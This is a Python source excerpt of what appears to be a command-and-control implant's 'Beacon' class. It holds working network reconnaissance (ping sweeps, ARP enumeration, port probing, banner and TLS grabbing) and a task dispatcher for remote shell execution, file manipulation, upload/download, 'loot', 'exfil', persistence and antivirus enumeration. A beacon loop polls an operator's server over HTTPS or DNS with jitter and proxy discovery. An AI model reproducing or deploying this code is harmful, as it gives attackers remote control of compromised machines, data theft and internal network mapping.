    def _mac_vendor(cls, mac: str) -> str:
        m = mac.lower().replace("-", ":")
        for prefix_len in (8, 5):
            prefix = m[:prefix_len]
            if prefix in cls._MAC_PREFIXES:
                return cls._MAC_PREFIXES[prefix]
        return ""

    @staticmethod
    def _guess_os(ports: list, vendor: str) -> str:
        ps = set(ports)
        if 3389 in ps or 135 in ps or 139 in ps:
            return "Windows"
        if 548 in ps or 5353 in ps:
            return "macOS" if "Apple" in vendor else "Apple/macOS"
        if 22 in ps and 111 in ps:
            return "Linux/Unix"
        if 22 in ps:
            return "Linux"
        if 80 in ps or 443 in ps:
            if vendor:
                if "Cisco" in vendor or "Juniper" in vendor or "Fortinet" in vendor:
                    return "Network Device"
                if "Ubiquiti" in vendor:
                    return "Ubiquiti AP"
                if "Synology" in vendor or "QNAP" in vendor:
                    return "NAS"
            return "Web Device"
        if vendor and ("Raspberry" in vendor):
            return "Linux (RPi)"
        return ""

    @staticmethod
    def _probe_ports(ip: str, ports: list, timeout: float = 0.8) -> list:
        open_ports = []
        for p in ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
                s.connect((ip, p))
                open_ports.append(p)
                s.close()
            except Exception:
                pass
        return open_ports

    _SSL_PORTS = {443, 993, 995, 8443, 636, 989, 990, 992, 5986, 9443}

    @staticmethod
    def _grab_banner(ip: str, port: int, timeout: float = 1.5) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((ip, port))
            if port in Beacon._SSL_PORTS or port == 443:
                s.close()
                return Beacon._probe_ssl(ip, port, timeout)
            if port in (80, 8080, 8888, 9090):
                s.sendall(b"HEAD / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\nConnection: close\r\n\r\n")
            elif port == 21:
                pass
            elif port == 25:
                pass
            else:
                s.sendall(b"\r\n")
            s.settimeout(2.0)
            data = s.recv(512)
            s.close()
            line = data.decode("utf-8", errors="replace").split("\n")[0].strip()
            return line[:160]
        except Exception:
            return ""

    @staticmethod
    def _probe_ssl(ip: str, port: int, timeout: float = 2.0) -> str:
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((ip, port), timeout=timeout) as sock:
                with ctx.wrap_socket(sock, server_hostname=ip) as ssock:
                    cert = ssock.getpeercert(binary_form=False)
                    der = ssock.getpeercert(binary_form=True)
                    ver = ssock.version() or "?"
                    if cert:
                        subj = dict(x[0] for x in cert.get("subject", ()))
                        cn = subj.get("commonName", "?")
                        issuer = dict(x[0] for x in cert.get("issuer", ()))
                        issuer_cn = issuer.get("commonName", issuer.get("organizationName", "?"))
                        not_after = cert.get("notAfter", "?")
                        san_list = []
                        for typ, val in cert.get("subjectAltName", ()):
                            if typ == "DNS":
                                san_list.append(val)
                        san = ", ".join(san_list[:4])
                        parts = [ver, f"CN={cn}"]
                        if issuer_cn != cn:
                            parts.append(f"Issuer={issuer_cn}")
                        parts.append(f"Expires={not_after}")
                        if san:
                            parts.append(f"SAN=[{san}]")
                        return " | ".join(parts)
                    else:
                        return f"{ver} | self-signed/no-cert"
        except ssl.SSLError as e:
            return f"SSL-Error: {str(e)[:80]}"
        except Exception:
            return "SSL"

    _PORT_NAMES = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 111: "RPC", 135: "MSRPC", 139: "NetBIOS",
        143: "IMAP", 161: "SNMP", 389: "LDAP", 443: "HTTPS", 445: "SMB",
        548: "AFP", 631: "IPP", 993: "IMAPS", 995: "POP3S",
        1433: "MSSQL", 1521: "Oracle", 3306: "MySQL", 3389: "RDP",
        5353: "mDNS", 5432: "PostgreSQL", 5900: "VNC", 5985: "WinRM",
        6379: "Redis", 8080: "HTTP-Alt", 8443: "HTTPS-Alt",
        8888: "HTTP-Alt", 9090: "HTTP-Alt", 9200: "Elasticsearch",
        27017: "MongoDB",
    }

    def _ping_sweep(self):
        local_ips = self._get_local_ips()
        if not local_ips:
            return
        bases = set()
        for ip in local_ips:
            parts = ip.rsplit(".", 1)
            if len(parts) == 2:
                bases.add(parts[0])

        def _ping(target):
            try:
                if platform.system() == "Windows":
                    subprocess.run(
                        ["ping", "-n", "1", "-w", "500", target],
                        capture_output=True, timeout=3,
                    )
                else:
                    subprocess.run(
                        ["ping", "-c", "1", "-W", "1", target],
                        capture_output=True, timeout=3,
                    )
            except Exception:
                pass

        threads = []
        for base in list(bases)[:3]:
            for i in range(1, 255):
                t = threading.Thread(target=_ping, args=(f"{base}.{i}",), daemon=True)
                threads.append(t)
                t.start()
                if len(threads) >= 30:
                    for tt in threads:
                        tt.join(timeout=2)
                    threads = []
        for tt in threads:
            tt.join(timeout=2)

    def _exec_arptable(self) -> str:
        self._ping_sweep()
        entries = []
        try:
            if platform.system() == "Windows":
                r = subprocess.run(
                    ["arp", "-a"], capture_output=True, text=True, timeout=10,
                )
                for line in r.stdout.splitlines():
                    parts = line.split()
                    if len(parts) >= 3 and parts[0].count(".") == 3:
                        ip = parts[0]
                        mac = parts[1].replace("-", ":")
                        typ = parts[2] if len(parts) > 2 else "?"
                        first_octet = int(ip.split(".")[0])
                        if ip not in ("255.255.255.255",) and not ip.endswith(".255") and first_octet < 224:
                            entries.append({"ip": ip, "mac": mac, "type": typ})
            else:
                r = subprocess.run(
                    ["arp", "-a"], capture_output=True, text=True, timeout=10,
                )
                if r.returncode != 0:
                    r = subprocess.run(
                        ["ip", "neigh", "show"], capture_output=True, text=True, timeout=10,
                    )
                for line in r.stdout.splitlines():
                    ip_m = re.search(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", line)
                    mac_m = re.search(r"([\da-fA-F]{2}[:-]){5}[\da-fA-F]{2}", line)
                    if ip_m:
                        ip = ip_m.group(1)
                        mac = mac_m.group(0) if mac_m else "?"
                        first_octet = int(ip.split(".")[0])
                        if ip not in ("255.255.255.255",) and not ip.endswith(".255") and first_octet < 224:
                            entries.append({"ip": ip, "mac": mac, "type": "?"})
        except Exception as e:
            return f"[error] {e}"

        seen_ips = set()
        unique = []
        for ent in entries:
            if ent["ip"] not in seen_ips:
                seen_ips.add(ent["ip"])
                unique.append(ent)
        entries = unique

        my_ips = set(self._get_local_ips())
        common_ports = [21,22,23,25,53,80,110,111,135,139,143,161,389,
                        443,445,548,636,631,993,995,1433,1521,
                        3306,3389,5353,5432,5900,5985,5986,
                        6379,8080,8443,8888,9090,9200,9443,27017]
        threads = []
        lock = threading.Lock()

        def enrich(ent):
            ip = ent["ip"]
            try:
                h = socket.getfqdn(ip)
                ent["hostname"] = "" if h == ip else h
            except Exception:
                ent["hostname"] = ""
            ent["vendor"] = self._mac_vendor(ent["mac"])
            ent["ports"] = self._probe_ports(ip, common_ports)
            ent["os_guess"] = self._guess_os(ent["ports"], ent["vendor"])
            ent["self"] = ip in my_ips
            banners = {}
            for p in ent["ports"][:8]:
                b = self._grab_banner(ip, p)
                if b:
                    banners[str(p)] = b
            ent["banners"] = banners
            port_info = []
            for p in ent["ports"]:
                name = self._PORT_NAMES.get(p, "")
                banner = banners.get(p, "")
                s = str(p)
                if name:
                    s += "/" + name
                if banner:
                    s += " (" + banner + ")"
                port_info.append(s)
            ent["port_info"] = port_info

        for ent in entries:
            t = threading.Thread(target=enrich, args=(ent,), daemon=True)
            threads.append(t)
            t.start()
            if len(threads) >= 10:
                for tt in threads:
                    tt.join(timeout=5)
                threads = []
        for tt in threads:
            tt.join(timeout=5)

        result = json.dumps({"entries": entries, "count": len(entries)})
        return result

    # ── Network scan ──

    def _exec_netscan(self, args: str) -> str:
        timeout_s = 1
        parts = args.strip().split() if args else []
        subnet = parts[0] if parts else ""

        if not subnet:
            for ip in self._get_local_ips():
                octets = ip.rsplit(".", 1)
                if len(octets) == 2:
                    subnet = octets[0] + ".0/24"
                    break

        if not subnet:
            return "[error] No subnet specified and no local IP found"

        base = subnet.split("/")[0].rsplit(".", 1)[0]
        results = []
        results.append(f"Scanning {base}.0/24 ...")

        def _ping_host(ip):
            try:
                if platform.system() == "Windows":
                    r = subprocess.run(
                        ["ping", "-n", "1", "-w", str(timeout_s * 1000), ip],
                        capture_output=True, text=True, timeout=timeout_s + 2,
                    )
                else:
                    r = subprocess.run(
                        ["ping", "-c", "1", "-W", str(timeout_s), ip],
                        capture_output=True, text=True, timeout=timeout_s + 2,
                    )
                return r.returncode == 0
            except Exception:
                return False

        def _tcp_probe(ip, port):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout_s)
                s.connect((ip, port))
                s.close()
                return True
            except Exception:
                return False

        alive = []
        threads = []
        lock = threading.Lock()

        def scan_host(ip):
            if _ping_host(ip) or _tcp_probe(ip, 445) or _tcp_probe(ip, 22):
                hostname = ""
                try:
                    hostname = socket.getfqdn(ip)
                    if hostname == ip:
                        hostname = ""
                except Exception:
                    pass
                ports = []
                for p in [22, 80, 135, 139, 443, 445, 3389, 8080, 8443]:
                    if _tcp_probe(ip, p):
                        ports.append(p)
                with lock:
                    alive.append({"ip": ip, "hostname": hostname, "ports": ports})

        for i in range(1, 255):
            ip = f"{base}.{i}"
            t = threading.Thread(target=scan_host, args=(ip,), daemon=True)
            threads.append(t)
            t.start()
            if len(threads) >= 20:
                for t in threads:
                    t.join(timeout=timeout_s + 3)
                threads = []

        for t in threads:
            t.join(timeout=timeout_s + 3)

        alive.sort(key=lambda h: tuple(int(o) for o in h["ip"].split(".")))
        my_ips = set(self._get_local_ips())

        for h in alive:
            marker = " [SELF]" if h["ip"] in my_ips else ""
            port_str = ",".join(str(p) for p in h["ports"]) if h["ports"] else "-"
            host_str = f' ({h["hostname"]})' if h["hostname"] else ""
            results.append(f'  {h["ip"]}{host_str}  ports:[{port_str}]{marker}')

        results.append(f"\n{len(alive)} hosts alive")
        return "\n".join(results)

    # ── Task dispatcher ──

    def _process_tasking(self, tasking: dict):
        if not tasking:
            return

        cmd = tasking.get("cmd", "")
        args = tasking.get("args", "")
        task_id = tasking.get("id", "")
        data = tasking.get("data", "")

        status = "ok"
        output = ""
        result_data = None

        try:
            if cmd == "sleep":
                parts = str(args).split()
                self.interval = max(1, float(parts[0]))
                if len(parts) > 1:
                    self.jitter = max(0, min(100, float(parts[1]))) / 100.0
                output = f"Sleep {self.interval}s jitter {int(self.jitter * 100)}%"
                logger.info(output)

            elif cmd == "kill":
                logger.warning("Kill command received")
                output = "Shutting down"
                self._running = False

            elif cmd == "shell":
                timeout = tasking.get("timeout", 300)
                output = self._exec_shell(args, timeout=timeout)

            elif cmd == "ls":
                output = self._exec_ls(args or ".")
            elif cmd == "lsjson":
                output = self._exec_lsjson(args or ".")

            elif cmd == "cat":
                output = self._exec_cat(args)

            elif cmd == "pwd":
                output = self._exec_pwd()

            elif cmd == "cd":
                output = self._exec_cd(args)

            elif cmd == "cp":
                parts = args.split(None, 1)
                if len(parts) == 2:
                    output = self._exec_cp(parts[0], parts[1])
                else:
                    status, output = "error", "Usage: cp <src> <dst>"

            elif cmd == "mv":
                parts = args.split(None, 1)
                if len(parts) == 2:
                    output = self._exec_mv(parts[0], parts[1])
                else:
                    status, output = "error", "Usage: mv <src> <dst>"

            elif cmd == "rm":
                output = self._exec_rm(args)

            elif cmd == "mkdir":
                output = self._exec_mkdir(args)

            elif cmd == "chmod":
                parts = args.split(None, 1)
                if len(parts) == 2:
                    output = self._exec_chmod(parts[0], parts[1])
                else:
                    status, output = "error", "Usage: chmod <mode> <path>"

            elif cmd == "write":
                output = self._exec_write(args, data)

            elif cmd == "upload":
                output = self._exec_upload(args, data)

            elif cmd == "download":
                dl = self._exec_download(args)
                if "error" in dl:
                    status = "error"
                    output = dl["error"]
                else:
                    output = f"Downloaded {dl['filename']} ({dl['size']} bytes)"
                    result_data = dl

            elif cmd == "loot":
                dl = self._exec_loot(args)
                if "error" in dl:
                    status = "error"
                    output = dl["error"]
                else:
                    fc = dl.get("files", 1)
                    output = f"Looted {dl['filename']} ({dl['size']} bytes, {fc} files)"
                    result_data = dl

            elif cmd == "exfil":
                output = "Exfil scan triggered"
                logger.info("Exfil tasking received")

            elif cmd == "netscan":
                output = self._exec_netscan(args)

            elif cmd == "arptable":
                output = self._exec_arptable()

            elif cmd == "persist":
                output = self._exec_persist(args)

            elif cmd == "unpersist":
                output = self._exec_unpersist(args)

            elif cmd == "proxyinfo":
                output = self._exec_proxyinfo()

            elif cmd == "avenum":
                output = self._exec_avenum()

            else:
                status = "error"
                output = f"Unknown command: {cmd}"

        except Exception as e:
            status = "error"
            output = f"[exception: {e}]"

        if task_id and self.https_enabled:
            self._send_result_https(task_id, status, output, result_data)

    # ── Main loop ──

    def _beacon_loop(self):
        logger.info(
            "Beacon started — ID=%s interval=%ds jitter=%d%%",
            self._implant_id, self.interval, int(self.jitter * 100),
        )

        if self.https_enabled:
            attempts = 0
            while self._running and not self._registered and attempts < 10:
                if self._register_https():
                    self._consecutive_failures = 0
                    break
                attempts += 1
                self._consecutive_failures = attempts
                self._backoff_sleep()
            if not self._registered:
                logger.warning("Registration failed, proceeding unregistered")
                self._consecutive_failures = 0

        while self._running:
            tasking = None

            if self.https_enabled:
                tasking = self._beacon_https()

            if tasking is None and self.dns_enabled:
                tasking = self._beacon_dns()

            if tasking is None:
                self._consecutive_failures += 1
                if self._consecutive_failures > 0 and self._consecutive_failures % 5 == 0:
                    logger.info("Re-registering after %d failures", self._consecutive_failures)
                    self._registered = False
                    self._register_https()
            elif tasking:
                self._consecutive_failures = 0
                logger.debug("Tasking: %s", tasking.get("cmd", "?"))
                self._process_tasking(tasking)
            else:
                self._consecutive_failures = 0

            if self._consecutive_failures > 3:
                self._backoff_sleep()
            else:
                self._jittered_sleep()

    def _init_proxy(self):
        self._proxy_session = _HttpSession()

        if self.proxy_mode == "none":
            self._proxy_session.trust_env = False
            logger.info("Proxy: disabled (direct connection)")
            return

        if self.proxy_mode == "manual" and self.proxy_url:
            self._proxy_session.proxies = {
                "http": self.proxy_url, "https": self.proxy_url,
            }
            logger.info("Proxy: manual — %s", self.proxy_url)
            return

        discovered = self._proxy.discover_all()
        if discovered:
            logger.info("Proxy: %s", self._proxy.summary())
            non_pac = [p for p in discovered if not p.get("is_pac")]
            if non_pac:
                working = self._proxy.select_working(
                    self.callback_url.rsplit("/", 1)[0], timeout=8)
                if working:
                    self._proxy_session.proxies = self._proxy.get_urllib_proxies()
                    return
            logger.info("Proxy: no working proxy found, trying direct")
        else:
            logger.info("Proxy: none discovered, using direct connection")
        self._proxy_session.trust_env = True

    def start(self):
        self._running = True
        self._init_proxy()
        self._thread = threading.Thread(
            target=self._beacon_loop, daemon=True, name="c2-beacon",
        )
        self._thread.start()

    def stop(self):
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
        logger.info("Beacon stopped")
